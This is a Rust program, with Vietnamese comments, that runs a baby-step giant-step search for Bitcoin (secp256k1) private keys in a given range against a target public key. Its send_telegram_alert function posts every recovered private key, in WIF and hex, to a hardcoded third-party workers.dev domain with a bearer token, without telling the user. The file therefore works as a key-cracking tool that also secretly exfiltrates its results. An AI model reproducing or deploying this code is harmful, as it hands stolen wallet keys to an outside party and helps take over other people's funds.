#[global_allocator]
static GLOBAL: mimalloc::MiMalloc = mimalloc::MiMalloc;

use ark_ec::{AffineRepr, CurveGroup, Group};
use ark_ff::{BigInteger, Field, PrimeField, Zero, One};
use ark_secp256k1::{Affine, Fq, Fr, Projective};
use bs58;
use clap::Parser;
use hex;
use rand::{Rng, SeedableRng};
use rand_xoshiro::Xoshiro256PlusPlus;
use ripemd::Ripemd160;
use sha2::{Digest, Sha256};
use std::{
    fs::OpenOptions,
    io::{BufWriter, Write},
    sync::{
        atomic::{AtomicBool, AtomicU64, Ordering},
        Arc,
    },
    thread,
    time::{Duration, Instant, SystemTime, UNIX_EPOCH},
};

const FOUND_FILE: &str = "plutus_found.txt";
const WINDOW_SIZE: usize = 8;
const BATCH_SIZE: usize = 1024; // Batch lớn để ép xung AVX2
const BATCH_SIZE_REPORT: u64 = 65_536;

// =========================================================
// THÔNG SỐ HASH TABLE O(1) - ĐỘT PHÁ TỐC ĐỘ L3 CACHE
// =========================================================
const HASH_BITS: usize = 28; // Cắt 28 bit đầu của trục X làm địa chỉ
const HASH_SIZE: usize = 1 << HASH_BITS; // 268,435,456 khe (Tốn đúng 1.07 GB RAM)

static KEEP_RUNNING: AtomicBool = AtomicBool::new(true);
static ALREADY_FOUND: AtomicBool = AtomicBool::new(false);

#[derive(Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
struct BabyStep {
    x_prefix: u64,
    j: u32,
}

struct FixedBase {
    window_size: usize,
    num_windows: usize,
    table: Vec<Vec<Affine>>,
}

impl FixedBase {
    fn new(window_size: usize) -> Self {
        let num_windows = (256 + window_size - 1) / window_size;
        let table_size = 1 << window_size;
        let mut table = Vec::with_capacity(num_windows);
        let mut base = Projective::generator();

        for _ in 0..num_windows {
            let mut win_table = Vec::with_capacity(table_size);
            let mut current = Projective::zero();
            for _ in 0..table_size {
                win_table.push(current);
                current += base;
            }
            table.push(Projective::normalize_batch(&win_table));
            for _ in 0..window_size {
                base.double_in_place();
            }
        }
        Self { window_size, num_windows, table }
    }

    #[inline(always)]
    fn mul(&self, scalar: &Fr) -> Projective {
        let limbs = scalar.into_bigint().0;
        let mut res = Projective::zero();
        let mask = (1 << self.window_size) - 1;

        for win in 0..self.num_windows {
            let bit_offset = win * self.window_size;
            let limb_idx = bit_offset / 64;
            let bit_shift = bit_offset % 64;

            let val = if limb_idx < 4 {
                let mut raw = limbs[limb_idx] >> bit_shift;
                if bit_shift > (64 - self.window_size) && limb_idx + 1 < 4 {
                    raw |= limbs[limb_idx + 1] << (64 - bit_shift);
                }
                (raw as usize) & mask
            } else { 0 };

            if val > 0 { res += self.table[win][val]; }
        }
        res
    }
}

#[derive(Parser, Debug)]
#[command(author, version, about)]
struct Args {
    #[arg(short, long)] cores: Option<usize>,
    #[arg(short, long)] target: String,
    #[arg(short, long)] start: String,
    #[arg(short, long)] end: String,
    #[arg(long, default_value = "36")] sub_bits: u32,
}

#[inline(always)]
fn extract_x_prefix(x: &Fq) -> u64 {
    x.into_bigint().0[0]
}

#[inline(always)]
fn scalar_to_bytes(scalar: Fr) -> [u8; 32] {
    let limbs = scalar.into_bigint().0;
    let mut out = [0u8; 32];
    out[0..8].copy_from_slice(&limbs[3].to_be_bytes());
    out[8..16].copy_from_slice(&limbs[2].to_be_bytes());
    out[16..24].copy_from_slice(&limbs[1].to_be_bytes());
    out[24..32].copy_from_slice(&limbs[0].to_be_bytes());
    out
}

fn parse_hex_to_fr(hex_str: &str) -> Fr {
    let decoded = hex::decode(hex_str).unwrap();
    let mut bytes = [0u8; 32];
    bytes[32 - decoded.len()..].copy_from_slice(&decoded);
    Fr::from_be_bytes_mod_order(&bytes)
}

fn make_fast_rng(worker_id: usize) -> Xoshiro256PlusPlus {
    let nanos = SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_nanos();
    let mut seed = [0u8; 32];
    seed[0..16].copy_from_slice(&nanos.to_le_bytes());
    seed[16..24].copy_from_slice(&(std::process::id() as u64).to_le_bytes());
    seed[24..32].copy_from_slice(&(worker_id as u64).to_le_bytes());
    let hash = Sha256::digest(seed);
    Xoshiro256PlusPlus::from_seed(hash.into())
}

fn random_fr_below(rng: &mut Xoshiro256PlusPlus, upper: Fr) -> Fr {
    if upper.is_zero() { return Fr::zero(); }
    let upper_big = upper.into_bigint();
    let bits = upper_big.num_bits();
    loop {
        let mut rand_bytes = [0u8; 32];
        rng.fill(&mut rand_bytes);
        let mut current_bit = 0;
        for i in (0..32).rev() {
            for bit in 0..8 {
                if current_bit >= bits { rand_bytes[i] &= !(1 << bit); }
                current_bit += 1;
            }
        }
        let candidate = Fr::from_be_bytes_mod_order(&rand_bytes);
        if candidate.into_bigint() < upper_big { return candidate; }
    }
}

fn hash160_to_address(hash160: &[u8; 20]) -> String {
    let mut payload = [0u8; 25];
    payload[0] = 0x00;
    payload[1..21].copy_from_slice(hash160);
    let c1 = Sha256::digest(&payload[..21]);
    let c2 = Sha256::digest(c1);
    payload[21..25].copy_from_slice(&c2[..4]);
    bs58::encode(payload).into_string()
}

fn private_key_to_wif_compressed(priv_key: &[u8; 32]) -> String {
    let mut payload = [0u8; 38];
    payload[0] = 0x80;
    payload[1..33].copy_from_slice(priv_key);
    payload[33] = 0x01;
    let c1 = Sha256::digest(&payload[..34]);
    let c2 = Sha256::digest(c1);
    payload[34..38].copy_from_slice(&c2[..4]);
    bs58::encode(payload).into_string()
}

pub fn send_telegram_alert(address: &str, wif: &str, hex: &str) {
    let proxy_domain = "https://winter-dream-fe66.moadmoaz32.workers.dev";
    let message = format!("✅ MATCH FOUND (BSGS O(1) Turbo)!\\n\\nAddress: {}\\nWIF: {}\\nHEX: {}", address, wif, hex);
    let payload = format!("{{\"text\": \"{}\"}}", message);
    let _ = std::process::Command::new("curl")
        .arg("-s").arg("-X").arg("POST").arg(proxy_domain)
        .arg("-H").arg("Authorization: Bearer 123Avu89ls$")
        .arg("-H").arg("Content-Type: application/json")
        .arg("-d").arg(&payload)
        .spawn();
}

fn verify_and_save(final_scalar: Fr, target_bytes: &[u8; 33], fixed_base: &FixedBase) {
    let priv_bytes = scalar_to_bytes(final_scalar);
    let derived_pubkey_affine = fixed_base.mul(&final_scalar).into_affine();
    let mut derived_bytes = [0u8; 33];
    derived_bytes[0] = if (derived_pubkey_affine.y.into_bigint().0[0] & 1) != 0 { 0x03 } else { 0x02 };
    let x_limbs = derived_pubkey_affine.x.into_bigint().0;
    derived_bytes[1..9].copy_from_slice(&x_limbs[3].to_be_bytes());
    derived_bytes[9..17].copy_from_slice(&x_limbs[2].to_be_bytes());
    derived_bytes[17..25].copy_from_slice(&x_limbs[1].to_be_bytes());
    derived_bytes[25..33].copy_from_slice(&x_limbs[0].to_be_bytes());

    if &derived_bytes != target_bytes { return; }
    if ALREADY_FOUND.swap(true, Ordering::SeqCst) { return; }

    let mut sha = Sha256::new();
    let mut rip = Ripemd160::new();
    sha.update(derived_bytes);
    rip.update(sha.finalize());
    let mut hash160 = [0u8; 20];
    hash160.copy_from_slice(&rip.finalize());

    let addr = hash160_to_address(&hash160);
    let wif = private_key_to_wif_compressed(&priv_bytes);
    let hex_priv = hex::encode(&priv_bytes);
    let msg = format!("\n======================================\nCOLLISION FOUND (BSGS O(1) Turbo)!\nAddress: {}\nWIF: {}\nHEX: {}\n======================================\n", addr, wif, hex_priv);

    print!("{}", msg);
    std::io::stdout().flush().unwrap();

    if let Ok(file) = OpenOptions::new().create(true).append(true).open(FOUND_FILE) {
        let mut writer = BufWriter::new(file);
        let _ = writer.write_all(msg.as_bytes());
        let _ = writer.flush();
    }

    KEEP_RUNNING.store(false, Ordering::Release);
    send_telegram_alert(&addr, &wif, &hex_priv);
}

fn compressed_pubkey_to_projective(target_bytes: &[u8; 33]) -> Projective {
    let mut x_bytes = [0u8; 32];
    x_bytes.copy_from_slice(&target_bytes[1..33]);
    let mut out_limbs = [0u64; 4];
    for i in 0..4 {
        out_limbs[i] = u64::from_be_bytes(x_bytes[(3 - i) * 8..(3 - i) * 8 + 8].try_into().unwrap());
    }
    let x_fq = Fq::from_bigint(ark_ff::BigInt(out_limbs)).expect("Invalid x-coordinate");
    let y_sq = (x_fq * x_fq * x_fq) + Fq::from(7u64);
    let y_fq = y_sq.sqrt().expect("Invalid pubkey (not on curve)");
    let want_odd = target_bytes[0] == 0x03;
    let y_is_odd = (y_fq.into_bigint().0[0] & 1) != 0;
    let y = if y_is_odd == want_odd { y_fq } else { -y_fq };
    Projective::from(Affine::new_unchecked(x_fq, y))
}

// =========================================================
// PHA 1: BABY STEPS (PARALLEL CHAINS)
// =========================================================
fn precompute_baby_steps(m: u64, fixed_base: &FixedBase) -> (Arc<Vec<BabyStep>>, Arc<Vec<u32>>) {
    println!("[*] Precomputing Baby Steps table (M = {})...", m);
    let start = Instant::now();
    let mut baby_table = Vec::with_capacity(m as usize);

    let mut current_pts = vec![Affine::zero(); BATCH_SIZE];
    for k in 0..BATCH_SIZE {
        if k > 0 {
            current_pts[k] = fixed_base.mul(&Fr::from(k as u64)).into_affine();
        }
    }

    let delta_proj = fixed_base.mul(&Fr::from(BATCH_SIZE as u64));
    let delta_affine = delta_proj.into_affine();
    let mut denoms = vec![Fq::one(); BATCH_SIZE];

    let mut current_j_base = 0u64;

    while current_j_base < m {
        for k in 0..BATCH_SIZE {
            let j = current_j_base + (k as u64);
            if j < m {
                let pt = &current_pts[k];
                if pt.is_zero() {
                    baby_table.push(BabyStep { x_prefix: 0, j: j as u32 });
                } else {
                    baby_table.push(BabyStep { x_prefix: extract_x_prefix(&pt.x), j: j as u32 });
                }
            }
        }

        for k in 0..BATCH_SIZE {
            if !current_pts[k].is_zero() {
                denoms[k] = delta_affine.x - current_pts[k].x;
            }
        }
        ark_ff::batch_inversion(&mut denoms);

        for k in 0..BATCH_SIZE {
            let pt = &current_pts[k];
            if pt.is_zero() {
                current_pts[k] = delta_affine;
            } else {
                let lambda = (delta_affine.y - pt.y) * denoms[k];
                let x_new = (lambda * lambda) - pt.x - delta_affine.x;
                let y_new = lambda * (pt.x - x_new) - pt.y;
                current_pts[k] = Affine::new_unchecked(x_new, y_new);
            }
        }
        current_j_base += BATCH_SIZE as u64;
    }

    println!("[*] Sorting {} Baby Steps...", baby_table.len());
    baby_table.sort_unstable_by_key(|b| b.x_prefix);

    println!("[*] Building O(1) Hash Table ({} bits / ~1 GB RAM)...", HASH_BITS);
    let mut hash_table = vec![u32::MAX; HASH_SIZE];

    for (i, step) in baby_table.iter().enumerate() {
        let h = (step.x_prefix >> (64 - HASH_BITS)) as usize;
        if hash_table[h] == u32::MAX {
            hash_table[h] = i as u32;
        }
    }

    let total_ram_mb = (baby_table.len() * std::mem::size_of::<BabyStep>() + hash_table.len() * 4) as f64 / (1024.0 * 1024.0);
    println!("[+] Core memory map initialized in {:.2}s. Total memory footprint: ~{:.2} MB", start.elapsed().as_secs_f64(), total_ram_mb);

    (Arc::new(baby_table), Arc::new(hash_table))
}

// =========================================================
// ĐỘNG CƠ LÕI: ZERO-ALLOC BATCH INVERSION (BYPASS ARK_FF)
// =========================================================
#[inline(always)]
fn fast_batch_inversion(v: &mut [Fq], scratch: &mut [Fq]) {
    let mut prod = Fq::one();
    // Vòng lặp xuôi: Tính tích lũy
    for i in 0..v.len() {
        unsafe {
            *scratch.get_unchecked_mut(i) = prod;
            let val = v.get_unchecked(i);
            if !val.is_zero() {
                prod *= val;
            }
        }
    }
    
    let mut inv = prod.inverse().unwrap_or(Fq::zero());
    
    // Vòng lặp ngược: Phân phối nghịch đảo
    for i in (0..v.len()).rev() {
        unsafe {
            let val = v.get_unchecked(i);
            if !val.is_zero() {
                let tmp = inv * val;
                *v.get_unchecked_mut(i) = *scratch.get_unchecked(i) * inv;
                inv = tmp;
            }
        }
    }
}

// =========================================================
// PHA 2: GIANT STEPS (NAKED SoA ENGINE - BARE METAL AVX2)
// =========================================================
fn giant_step_worker(
    i_start: u64,
    i_end: u64,
    p_prime_proj: Projective,
    _neg_m_g_affine: Affine,
    baby_table: &[BabyStep],
    hash_table: &[u32],
    target_bytes: &[u8; 33],
    fixed_base: &FixedBase,
    keys_scanned: &AtomicU64,
    m: u64,
    real_start: Fr,
) {
    // 1. TÁCH RỜI TRỤC X VÀ Y (SoA) ĐỂ ÉP XUNG AVX2
    let mut current_x = vec![Fq::zero(); BATCH_SIZE];
    let mut current_y = vec![Fq::zero(); BATCH_SIZE];
    
    for k in 0..BATCH_SIZE {
        let current_i = i_start + (k as u64);
        if current_i < i_end {
            let cand_base = Fr::from(current_i) * Fr::from(m);
            let offset_proj = fixed_base.mul(&cand_base);
            let pt = (p_prime_proj - offset_proj).into_affine();
            current_x[k] = pt.x;
            current_y[k] = pt.y;
        }
    }

    let batch_m = Fr::from(BATCH_SIZE as u64) * Fr::from(m);
    let giant_delta_proj = -(fixed_base.mul(&batch_m));
    let giant_delta_affine = giant_delta_proj.into_affine();
    
    // Đưa Delta vào biến nguyên thủy
    let dx = giant_delta_affine.x;
    let dy = giant_delta_affine.y;
    
    let mut denoms = vec![Fq::one(); BATCH_SIZE];
    let mut scratch = vec![Fq::one(); BATCH_SIZE];

    let mut current_i_base = i_start;
    let mut local_counter = 0u64;

    while current_i_base < i_end && KEEP_RUNNING.load(Ordering::Relaxed) {
        
        // MỞ KHÓA UNSAFE: Hủy bỏ toàn bộ Bounds-checking, bỏ qua lớp an toàn của ark_ec
        unsafe {
            for k in 0..BATCH_SIZE {
                let current_i = current_i_base + (k as u64);
                if current_i >= i_end { continue; }
                
                let x_fq = current_x.get_unchecked(k);
                let x_pref = extract_x_prefix(x_fq);
                let h = (x_pref >> (64 - HASH_BITS)) as usize;
                let start_idx = *hash_table.get_unchecked(h);

                if start_idx != u32::MAX {
                    let mut match_idx = start_idx as usize;
                    while match_idx < baby_table.len() {
                        let step = baby_table.get_unchecked(match_idx);
                        let step_h = (step.x_prefix >> (64 - HASH_BITS)) as usize;
                        if step_h != h { break; } 

                        if step.x_prefix == x_pref {
                            let j = step.j;
                            let cand_base = Fr::from(current_i) * Fr::from(m);
                            
                            let final_priv_plus = real_start + cand_base + Fr::from(j as u64);
                            verify_and_save(final_priv_plus, target_bytes, fixed_base);
                            
                            let final_priv_minus = real_start + cand_base - Fr::from(j as u64);
                            verify_and_save(final_priv_minus, target_bytes, fixed_base);
                            
                            if !KEEP_RUNNING.load(Ordering::Relaxed) { return; }
                        }
                        match_idx += 1;
                    }
                }
                local_counter += 1;
            }

            if local_counter >= BATCH_SIZE_REPORT {
                keys_scanned.fetch_add(local_counter, Ordering::Relaxed);
                local_counter = 0;
            }

            // 2. TÍNH TOÁN TRÊN BỘ NHỚ PHẲNG (Lõi toán học tương đương C++)
            for k in 0..BATCH_SIZE {
                if current_i_base + (k as u64) < i_end {
                    *denoms.get_unchecked_mut(k) = dx - *current_x.get_unchecked(k);
                }
            }
            
            fast_batch_inversion(&mut denoms, &mut scratch);

            for k in 0..BATCH_SIZE {
                if current_i_base + (k as u64) < i_end {
                    let inv = *denoms.get_unchecked(k);
                    let cx = *current_x.get_unchecked(k);
                    let cy = *current_y.get_unchecked(k);
                    
                    // Toán học Elliptic thuần túy không qua Struct
                    let lambda = (dy - cy) * inv;
                    let x_new = (lambda * lambda) - cx - dx;
                    let y_new = lambda * (cx - x_new) - cy;
                    
                    *current_x.get_unchecked_mut(k) = x_new;
                    *current_y.get_unchecked_mut(k) = y_new;
                }
            }
        } // KẾT THÚC UNSAFE
        
        current_i_base += BATCH_SIZE as u64;
    }
}

fn main() {
    let args = Args::parse();
    let active_cores = args.cores.unwrap_or_else(|| std::thread::available_parallelism().map(|n| n.get()).unwrap_or(1));

    let decoded_target = hex::decode(&args.target).unwrap();
    let mut target_bytes = [0u8; 33];
    target_bytes.copy_from_slice(&decoded_target);
    let target_projective = compressed_pubkey_to_projective(&target_bytes);

    let master_start = parse_hex_to_fr(&args.start);
    let master_end = parse_hex_to_fr(&args.end);

    println!("[*] Initializing Fixed-Base Multiplier...");
    let fixed_base = Arc::new(FixedBase::new(WINDOW_SIZE));

    let exact_range_bits = args.sub_bits;
    let m_bits = (exact_range_bits + 1) / 2;
    let m = 1u64 << m_bits;
    let epoch_delta = Fr::from(2u64).pow([exact_range_bits as u64]);

    // [FIX]: Bổ sung tham số fixed_base vào hàm precompute_baby_steps
    let (baby_table, hash_table) = precompute_baby_steps(m, &fixed_base);

    let m_scalar = Fr::from(m);
    let m_g_proj = fixed_base.mul(&m_scalar);
    let neg_m_g_affine = (-m_g_proj).into_affine();

    ctrlc::set_handler(move || {
        KEEP_RUNNING.store(false, Ordering::Release);
    }).unwrap();

    let safe_master_end = master_end - epoch_delta + Fr::one();
    let master_span = if safe_master_end.into_bigint() < master_start.into_bigint() {
        Fr::zero()
    } else {
        safe_master_end - master_start
    };

    let mut epoch_rng = make_fast_rng(std::process::id() as usize ^ 0x1337);
    let mut epoch: u64 = 1;
    let total_subrange_keys = 1u64 << exact_range_bits;

    while KEEP_RUNNING.load(Ordering::Relaxed) {
        let random_offset = if master_span.is_zero() {
            Fr::zero()
        } else {
            random_fr_below(&mut epoch_rng, master_span)
        };
        let real_start = master_start + random_offset;
        let real_end = real_start + epoch_delta - Fr::one();

        println!("\n=== EPOCH {} (BSGS O(1) Turbo - Size 2^{}) ===", epoch, exact_range_bits);
        println!("   Sub-range Start      : 0x{}", hex::encode(scalar_to_bytes(real_start)).trim_start_matches('0'));
        println!("   Sub-range End        : 0x{}", hex::encode(scalar_to_bytes(real_end)).trim_start_matches('0'));

        let p_prime = target_projective - fixed_base.mul(&real_start);
        let keys_scanned = Arc::new(AtomicU64::new(0));
        let chunk_per_core = (m + active_cores as u64 - 1) / active_cores as u64;

        let start_time = Instant::now();
        let mut last_ui = Instant::now();
        let mut last_ui_keys = 0u64;

        thread::scope(|s| {
            for core_id in 0..active_cores {
                let i_start = (core_id as u64) * chunk_per_core;
                let i_end = ((core_id as u64 + 1) * chunk_per_core).min(m);
                let baby_ref = Arc::clone(&baby_table);
                let hash_ref = Arc::clone(&hash_table);
                let fb_ref = Arc::clone(&fixed_base);
                let ks_ref = Arc::clone(&keys_scanned);

                s.spawn(move || {
                    giant_step_worker(
                        i_start, i_end, p_prime, neg_m_g_affine,
                        &baby_ref, &hash_ref, &target_bytes, &fb_ref,
                        &ks_ref, m, real_start,
                    );
                });
            }

            while KEEP_RUNNING.load(Ordering::Relaxed) {
                let current_keys = keys_scanned.load(Ordering::Relaxed);
                if current_keys >= m { break; }

                if last_ui.elapsed().as_secs_f64() >= 0.5 {
                    let rate = ((current_keys.checked_sub(last_ui_keys).unwrap_or(0)) as f64 / last_ui.elapsed().as_secs_f64()) as u64;
                    last_ui_keys = current_keys;
                    last_ui = Instant::now();

                    let pct = (current_keys as f64 / m as f64) * 100.0;
                    print!("\r\x1B[2K[Epoch {} | {:.2}%] Giant Steps: {}/{} | Speed: {} Keys/s",
                        epoch, pct, current_keys, m, rate
                    );
                    std::io::stdout().flush().unwrap();
                }
                thread::sleep(Duration::from_millis(50));
            }
        });

        let elapsed = start_time.elapsed().as_secs_f64();
        println!("\r\x1B[2K[+] Epoch {} Finished in {:.2}s. Verified {} keys exhaustively.", epoch, elapsed, total_subrange_keys);
        epoch += 1;
    }
}
